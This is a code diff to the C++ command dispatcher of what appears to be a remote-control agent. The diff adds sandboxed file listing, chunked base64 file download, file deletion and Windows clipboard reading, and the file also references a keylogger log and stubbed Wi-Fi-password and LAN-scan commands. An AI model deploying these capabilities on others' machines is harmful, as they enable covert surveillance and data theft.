@@ -2,29 +2,111 @@
 #include "modules/process.hpp"
 #include "modules/screen.hpp"
 #include "modules/camera.hpp"
+#include "modules/system_control.hpp"
+#include "utils/base64.hpp"
 
 #include <iostream>
 #include <fstream>
 #include <cstdio> // Cho std::remove
 #include <cerrno> // Cho ENOENT (Error No Entry)
 #include <optional>
+#include <filesystem>
+#include <vector>
+#include <cstdlib>
+#include <algorithm>
+#include <cstdint>
+#include <system_error>
 
 #define KEYLOGGER_FILE_NAME "keylogger.txt"
+
+namespace {
+constexpr std::size_t kMinChunkBytes = 4096;
+constexpr std::size_t kMaxChunkBytes = 262144;
+
+std::filesystem::path get_file_root() {
+    const char* env_root = std::getenv("SERVER_FILE_ROOT");
+    if (env_root && *env_root) {
+        return std::filesystem::path(env_root);
+    }
+    return std::filesystem::current_path();
+}
+
+bool is_subpath(const std::filesystem::path& path, const std::filesystem::path& root) {
+    auto path_it = path.begin();
+    auto root_it = root.begin();
+    for (; root_it != root.end(); ++root_it, ++path_it) {
+        if (path_it == path.end() || *path_it != *root_it) {
+            return false;
+        }
+    }
+    return true;
+}
+
+bool resolve_safe_path(const std::string& raw,
+                       std::filesystem::path& resolved,
+                       std::filesystem::path& root_out,
+                       std::string& error_out) {
+    std::error_code ec;
+    std::filesystem::path root = get_file_root();
+    root = std::filesystem::weakly_canonical(root, ec);
+    if (ec) {
+        ec.clear();
+        root = std::filesystem::absolute(root, ec);
+    }
+    root = root.lexically_normal();
+    root_out = root;
+
+    std::filesystem::path candidate(raw);
+    if (candidate.is_relative()) {
+        candidate = root / candidate;
+    }
+    std::filesystem::path normalized = std::filesystem::weakly_canonical(candidate, ec);
+    if (ec) {
+        ec.clear();
+        normalized = std::filesystem::absolute(candidate, ec);
+    }
+    normalized = normalized.lexically_normal();
+
+    if (!is_subpath(normalized, root)) {
+        error_out = "path_not_allowed";
+        return false;
+    }
+
+    resolved = normalized;
+    return true;
+}
+
+void ensure_response_shape(const std::string& cmd, Json& resp) {
+    if (!resp.contains("cmd")) {
+        resp["cmd"] = cmd.empty() ? "unknown" : cmd;
+    }
+    if (!resp.contains("status")) {
+        resp["status"] = resp.contains("error") ? "error" : "ok";
+    }
+}
+} // namespace
 std::string Dispatcher::handle(const std::string& request_json)
 {
     std::cout << "[Dispatcher] Incoming request: " << request_json << "\n";
 
     Json res;
     std::optional<std::string> request_id;
+    std::string cmd;
 
     try {
         Json req = Json::parse(request_json);
-        std::string cmd = req.value("cmd", "");
+        cmd = req.value("cmd", "");
         if (req.contains("requestId") && req["requestId"].is_string()) {
             request_id = req["requestId"].get<std::string>();
         }
 
-        if (cmd == "ping") {
+        if (cmd.empty()) {
+            res["cmd"] = "unknown";
+            res["status"] = "error";
+            res["error"] = "missing_cmd";
+            res["message"] = "Missing cmd";
+        }
+        else if (cmd == "ping") {
             res = handle_ping(req);
         }
         else if (cmd == "process_list") {
@@ -54,17 +136,39 @@ std::string Dispatcher::handle(const std::string& request_json)
         else if (cmd == "clearlogs") {
             res = handle_clearlogs(req);
         }
-        else if (cmd == "sysinfo" || cmd == "scanlan" || cmd == "wifi-pass" || cmd == "download-file" || cmd == "list-files" || cmd == "delete-file") {
-             res["cmd"] = cmd;
-             res["status"]  = "error";
-             res["message"] = "Command '" + cmd + "' is not yet implemented in the backend.";
+        else if (cmd == "list-files") {
+            res = handle_list_files(req);
+        }
+        else if (cmd == "download-file") {
+            res = handle_download_file(req);
+        }
+        else if (cmd == "delete-file") {
+            res = handle_delete_file(req);
+        }
+        else if (cmd == "clipboard-get") {
+            res = handle_clipboard_get(req);
+        }
+        else if (cmd == "sysinfo" || cmd == "scanlan" || cmd == "wifi-pass") {
+            res["cmd"] = cmd;
+            res["status"]  = "error";
+            res["error"] = "not_implemented";
+            res["message"] = "Command '" + cmd + "' is not yet implemented in the backend.";
+        }
+        else {
+            res["cmd"] = cmd.empty() ? "unknown" : cmd;
+            res["status"] = "error";
+            res["error"] = "unknown_command";
+            res["message"] = "Unknown command";
         }
     }
     catch (const std::exception& e) {
+        res["cmd"] = cmd.empty() ? "unknown" : cmd;
         res["status"]  = "error";
+        res["error"] = "exception";
         res["message"] = std::string("Exception: ") + e.what();
     }
 
+    ensure_response_shape(cmd, res);
     if (request_id) {
         res["requestId"] = *request_id;
     }
@@ -236,4 +340,285 @@ Json Dispatcher::handle_screen_stream(const Json& req)
     resp["fps"] = fps;
 
     return resp;
+}
+
+Json Dispatcher::handle_list_files(const Json& req)
+{
+    Json resp;
+    resp["cmd"] = "list-files";
+
+    if (!req.contains("dir") || !req["dir"].is_string()) {
+        resp["status"] = "error";
+        resp["error"] = "invalid_request";
+        resp["message"] = "Missing or invalid dir";
+        return resp;
+    }
+
+    std::string dir = req["dir"].get<std::string>();
+    std::filesystem::path resolved;
+    std::filesystem::path root;
+    std::string error;
+    if (!resolve_safe_path(dir, resolved, root, error)) {
+        resp["status"] = "error";
+        resp["error"] = error;
+        resp["message"] = "Path not allowed";
+        resp["dir"] = dir;
+        return resp;
+    }
+
+    std::error_code ec;
+    if (!std::filesystem::exists(resolved, ec)) {
+        resp["status"] = "error";
+        resp["error"] = "not_found";
+        resp["message"] = "Directory not found";
+        resp["dir"] = dir;
+        return resp;
+    }
+    if (!std::filesystem::is_directory(resolved, ec)) {
+        resp["status"] = "error";
+        resp["error"] = "not_directory";
+        resp["message"] = "Path is not a directory";
+        resp["dir"] = dir;
+        return resp;
+    }
+
+    Json items = Json::array();
+    std::filesystem::directory_iterator it(resolved, ec);
+    if (ec) {
+        resp["status"] = "error";
+        resp["error"] = "permission_denied";
+        resp["message"] = ec.message();
+        resp["dir"] = dir;
+        return resp;
+    }
+
+    std::filesystem::directory_iterator end;
+    while (it != end) {
+        std::error_code entry_ec;
+        const auto& path = it->path();
+        bool is_dir = it->is_directory(entry_ec);
+        if (!entry_ec) {
+            std::uintmax_t size = 0;
+            if (!is_dir) {
+                size = it->file_size(entry_ec);
+                if (entry_ec) {
+                    size = 0;
+                }
+            }
+
+            std::string rel_path;
+            std::filesystem::path relative = std::filesystem::relative(path, root, entry_ec);
+            if (!entry_ec) {
+                rel_path = relative.lexically_normal().generic_string();
+            } else {
+                rel_path = path.lexically_normal().generic_string();
+            }
+
+            Json item;
+            item["name"] = path.filename().generic_string();
+            item["path"] = rel_path.empty() ? path.filename().generic_string() : rel_path;
+            item["is_dir"] = is_dir;
+            item["size"] = static_cast<std::uintmax_t>(size);
+            items.push_back(item);
+        }
+
+        it.increment(entry_ec);
+        if (entry_ec) {
+            entry_ec.clear();
+        }
+    }
+
+    resp["status"] = "ok";
+    resp["dir"] = dir;
+    resp["items"] = items;
+    return resp;
+}
+
+Json Dispatcher::handle_delete_file(const Json& req)
+{
+    Json resp;
+    resp["cmd"] = "delete-file";
+
+    if (!req.contains("path") || !req["path"].is_string()) {
+        resp["status"] = "error";
+        resp["error"] = "invalid_request";
+        resp["message"] = "Missing or invalid path";
+        return resp;
+    }
+
+    std::string path = req["path"].get<std::string>();
+    std::filesystem::path resolved;
+    std::filesystem::path root;
+    std::string error;
+    if (!resolve_safe_path(path, resolved, root, error)) {
+        resp["status"] = "error";
+        resp["error"] = error;
+        resp["message"] = "Path not allowed";
+        resp["path"] = path;
+        return resp;
+    }
+
+    std::error_code ec;
+    bool removed = std::filesystem::remove(resolved, ec);
+    if (!removed || ec) {
+        resp["status"] = "error";
+        if (ec == std::errc::no_such_file_or_directory) {
+            resp["error"] = "not_found";
+            resp["message"] = "File not found";
+        } else if (ec == std::errc::permission_denied) {
+            resp["error"] = "permission_denied";
+            resp["message"] = "Permission denied";
+        } else {
+            resp["error"] = "delete_failed";
+            resp["message"] = ec ? ec.message() : "Delete failed";
+        }
+        resp["path"] = path;
+        return resp;
+    }
+
+    resp["status"] = "ok";
+    resp["deleted"] = true;
+    resp["path"] = path;
+    return resp;
+}
+
+Json Dispatcher::handle_download_file(const Json& req)
+{
+    Json resp;
+    resp["cmd"] = "download-file";
+
+    if (!req.contains("path") || !req["path"].is_string()) {
+        resp["status"] = "error";
+        resp["error"] = "invalid_request";
+        resp["message"] = "Missing or invalid path";
+        return resp;
+    }
+
+    std::string path = req["path"].get<std::string>();
+    std::filesystem::path resolved;
+    std::filesystem::path root;
+    std::string error;
+    if (!resolve_safe_path(path, resolved, root, error)) {
+        resp["status"] = "error";
+        resp["error"] = error;
+        resp["message"] = "Path not allowed";
+        resp["path"] = path;
+        return resp;
+    }
+
+    std::size_t offset = 0;
+    if (req.contains("offset")) {
+        if (!req["offset"].is_number_integer()) {
+            resp["status"] = "error";
+            resp["error"] = "invalid_request";
+            resp["message"] = "Invalid offset";
+            resp["path"] = path;
+            return resp;
+        }
+        offset = static_cast<std::size_t>(std::max<std::int64_t>(0, req["offset"].get<std::int64_t>()));
+    }
+
+    std::size_t max_bytes = kMaxChunkBytes;
+    if (req.contains("max_bytes")) {
+        if (!req["max_bytes"].is_number_integer()) {
+            resp["status"] = "error";
+            resp["error"] = "invalid_request";
+            resp["message"] = "Invalid max_bytes";
+            resp["path"] = path;
+            return resp;
+        }
+        auto requested = static_cast<std::size_t>(std::max<std::int64_t>(0, req["max_bytes"].get<std::int64_t>()));
+        max_bytes = std::min(std::max(requested, kMinChunkBytes), kMaxChunkBytes);
+    }
+
+    std::error_code ec;
+    auto file_size = std::filesystem::file_size(resolved, ec);
+    if (ec) {
+        resp["status"] = "error";
+        if (ec == std::errc::no_such_file_or_directory) {
+            resp["error"] = "not_found";
+            resp["message"] = "File not found";
+        } else if (ec == std::errc::permission_denied) {
+            resp["error"] = "permission_denied";
+            resp["message"] = "Permission denied";
+        } else {
+            resp["error"] = "read_failed";
+            resp["message"] = ec.message();
+        }
+        resp["path"] = path;
+        return resp;
+    }
+
+    if (offset >= file_size) {
+        resp["status"] = "ok";
+        resp["path"] = path;
+        resp["offset"] = static_cast<std::uint64_t>(offset);
+        resp["bytes_read"] = 0;
+        resp["eof"] = true;
+        resp["data_base64"] = "";
+        return resp;
+    }
+
+    std::ifstream file(resolved, std::ios::binary);
+    if (!file) {
+        resp["status"] = "error";
+        resp["error"] = "read_failed";
+        resp["message"] = "Failed to open file";
+        resp["path"] = path;
+        return resp;
+    }
+
+    file.seekg(static_cast<std::streamoff>(offset), std::ios::beg);
+    if (!file) {
+        resp["status"] = "error";
+        resp["error"] = "read_failed";
+        resp["message"] = "Failed to seek file";
+        resp["path"] = path;
+        return resp;
+    }
+
+    std::size_t to_read = std::min<std::size_t>(max_bytes, static_cast<std::size_t>(file_size - offset));
+    std::vector<unsigned char> buffer(to_read);
+    file.read(reinterpret_cast<char*>(buffer.data()), static_cast<std::streamsize>(to_read));
+    std::streamsize read_count = file.gcount();
+
+    std::string encoded;
+    if (read_count > 0) {
+        encoded = base64_encode(buffer.data(), static_cast<std::size_t>(read_count));
+    }
+
+    bool eof = (offset + static_cast<std::size_t>(read_count)) >= file_size;
+
+    resp["status"] = "ok";
+    resp["path"] = path;
+    resp["offset"] = static_cast<std::uint64_t>(offset);
+    resp["bytes_read"] = static_cast<std::uint64_t>(read_count);
+    resp["eof"] = eof;
+    resp["data_base64"] = encoded;
+    return resp;
+}
+
+Json Dispatcher::handle_clipboard_get(const Json&)
+{
+    Json resp;
+    resp["cmd"] = "clipboard-get";
+#ifdef _WIN32
+    SystemControl control;
+    std::string text;
+    std::string error;
+    if (!control.get_clipboard_text(text, error)) {
+        resp["status"] = "error";
+        resp["error"] = "read_failed";
+        resp["message"] = error.empty() ? "Failed to read clipboard" : error;
+        return resp;
+    }
+    resp["status"] = "ok";
+    resp["text"] = text;
+    return resp;
+#else
+    resp["status"] = "error";
+    resp["error"] = "not_supported";
+    resp["message"] = "clipboard supported on Windows only";
+    return resp;
+#endif
 }
